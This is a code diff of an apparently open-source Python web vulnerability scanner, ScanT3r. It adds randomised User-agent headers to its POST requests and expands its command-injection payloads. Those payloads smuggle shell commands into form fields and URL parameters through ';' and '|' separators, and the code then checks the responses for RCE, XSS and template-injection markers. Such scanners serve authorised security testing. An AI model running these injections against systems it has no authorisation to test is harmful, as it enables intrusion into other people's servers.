@@ -50,7 +50,7 @@ def uagent():
 	]
 	return random.choice(agents).encode('utf-8')
 
-class from_url_get:
+class paramscanner:
 	def __init__(slef):
 		pass
 	def xss(slef,url,co,tim,deco):
@@ -104,14 +104,14 @@ class from_url_get:
 						dat[i] = c.replace('*',payload)
 					if tim:
 						if co:
-							r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
+							r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 						else:
-							r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
+							r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 					else:
 						if co:
-							r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
+							r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 						else:
-							r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
+							r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 					if payload.encode('utf-8') in r.content:
 						print(f"""
 {bold}{good}{bold} Bug Found : XSS Reflected
@@ -133,14 +133,14 @@ class from_url_get:
 					dat[i] = c + payload
 				if tim:
 					if co:
-						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
+						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 					else:
-						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
+						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 				else:
 					if co:
-						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
+						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 					else:
-						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
+						r = requests.post(url,data=dat,headers={'User-agent':uagent()},verify=vert,allow_redirects=redir)
 				if payload.encode('utf-8') in r.content:
 					print(f"""
 {bold}{good}{bold} Bug Found : XSS Reflected
@@ -166,14 +166,14 @@ class from_url_get:
 				dat[i] = d.replace('*',payload)
 			if tim:
 				if co:
-					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
+					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 				else:
-					r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
+					r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 			else:
 				if co:
-					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
+					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 				else:
-					r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
+					r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 			for f,i in errors.items():
 				ch=re.findall(i.encode('utf-8'),r.content)
 				if len(ch) > 0:
@@ -192,14 +192,14 @@ class from_url_get:
 				dat[i] = d + payload
 			if tim:
 				if co:
-					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
+					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 				else:
-					r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
+					r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 			else:
 				if co:
-					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
+					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 				else:
-					r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
+					r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 			for f,i in errors.items():
 				ch=re.findall(i.encode('utf-8'),r.content)
 				if len(ch) > 0:
@@ -218,20 +218,20 @@ class from_url_get:
 			if '*' in d:
 				ok = True
 		if ok:
-			payloads=["; 'echo Command Injection (ScanT3r)' | base64 ;",'''; python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print (m)" ;''']
+			payloads=['''| python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print (m)" ;''',"; 'echo Command Injection (ScanT3r)' | base64 ;",'''| python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print (m)" ;''','''; python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print (m)" ;''']
 			for payload in payloads:
 				for i,c in dat.items():
 					dat[i] = c.replace('*',payload)
 				if tim:
 					if co:
-						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
+						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 					else:
-						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
+						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 				else:
 					if co:
-						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
+						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 					else:
-						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
+						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 				if 'Q29tbWFuZCBJbmplY3Rpb24gfHwgU2NhblQzcg=='.encode('utf-8') in r.content or 'Q29tbWFuZCBJbmplY3Rpb24gKFNjYW5UM3IpCg=='.encode('utf-8') in r.content:
 					print(f"""
 {bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
@@ -253,14 +253,14 @@ class from_url_get:
 					dat[i] = d + payload
 				if tim:
 					if co:
-						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
+						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 					else:
-						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
+						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 				else:
 					if co:
-						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
+						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 					else:
-						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
+						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 				if 'Q29tbWFuZCBJbmplY3Rpb24gfHwgU2NhblQzcg=='.encode('utf-8') in r.content or 'Q29tbWFuZCBJbmplY3Rpb24gKFNjYW5UM3IpCg=='.encode('utf-8') in r.content:
 					print(f"""
 {bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
@@ -287,14 +287,14 @@ class from_url_get:
 					dat[i] = c.replace('*',payload)
 				if tim:
 					if co:
-						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
+						r = requests.post(url,data=dat,headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
 					else:
-						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
+						r = requests.post(url,data=dat,verify=vert,headers={'User-agent':uagent()},allow_redirects=redir,timeout=tim)
 				else:
 					if co:
-						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
+						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 					else:
-						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
+						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 				if '2318290600713165858675521351981765038022843684314114299721561440515716'.encode('utf-8') in r.content:
 					print(f"""
 {bold}{good}{bold} Bug Found : Template injection (SSTI)
@@ -316,14 +316,14 @@ class from_url_get:
 					dat[i] = c + payload
 				if tim:
 					if co:
-						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
+						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 					else:
-						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim)
+						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
 				else:
 					if co:
-						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir)
+						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 					else:
-						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir)
+						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
 				if '2318290600713165858675521351981765038022843684314114299721561440515716'.encode('utf-8') in r.content:
 					print(f"""
 {bold}{good}{bold} Bug Found : Template injection (SSTI)
@@ -396,7 +396,7 @@ class from_url_get:
 	def osinj(self,url,co,tim,deco):
 		deco = deco - 1
 		if '*' in url:
-			payloads=["; echo 'Command Injection (ScanT3r)' | base64 ;",'''; python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print (m)" ;''']
+			payloads=[";echo 'Command Injection (ScanT3r)'|base64;",''';python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print (m)";''','''|python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print (m)" ;''']
 			for payload in payloads:
 				for h in range(deco):
 					payload2=urlencoder(payload)
